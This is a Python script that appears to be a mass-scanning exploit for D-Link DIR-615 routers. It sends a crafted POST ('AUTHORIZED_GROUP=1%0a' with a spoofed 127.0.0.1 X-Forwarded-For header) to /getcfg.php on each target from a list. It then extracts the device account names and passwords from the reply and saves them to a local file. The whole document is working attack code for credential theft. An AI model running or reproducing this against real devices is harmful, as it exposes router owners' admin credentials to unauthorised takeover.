import requests
import argparse
import re
import urllib3
urllib3.disable_warnings()
parser = argparse.ArgumentParser(description='api help')
parser.add_argument('-u','--url', help='Please Input a url!',default='')
parser.add_argument('-r','--read', help='Please Input a file!',default='')
args=parser.parse_args()
url=args.url
file=args.read

if url !="":
    url=url+"/getcfg.php"
    header={
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Content-Type":"application/x-www-form-urlencoded",
    "Cookie":"",
    "X-Forwarded-For":"127.0.0.1"
            }
    data = ("SERVICES=DEVICE.ACCOUNT&AUTHORIZED_GROUP=1%0a")
    response=requests.post(url,data=data,headers=header,verify=False,timeout=10)
    print(response.text)
    if  "DEVICE.ACCOUNT" in response.text and response.status_code == 200:
        print("[" + url + "]" + "[===dangerous===]")
    else:
        print("["+url+"]"+"[safe]")

if file !="":
    txt=file
    f=open(txt,'r+')
    for i in f.readlines():
        url=i.strip()
        url=url+"/getcfg.php"
        header={
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded",
        "Cookie":"",
        "X-Forwarded-For": "127.0.0.1"
        }
        data = ("SERVICES=DEVICE.ACCOUNT&AUTHORIZED_GROUP=1%0a")
        try:
            response=requests.post(url,data=data,headers=header,verify=False,timeout=10)
            if "DEVICE.ACCOUNT" in response.text and response.status_code == 200:
                name = re.findall('<name>.*', response.text)
                password = re.findall('<password>.*', response.text)
                print("[" + url + "]" + "[===dangerous===]")
                w = open("DIR-615-Vulnerability-file.txt", "a")
                w.write(url + '\r\n' + repr(name) + repr(password) + '\r\n')
            else:
                print("[" + url + "]" + "[safe]")
        except Exception as e:
            print("["+url+"]"+"[safe]",format(e))
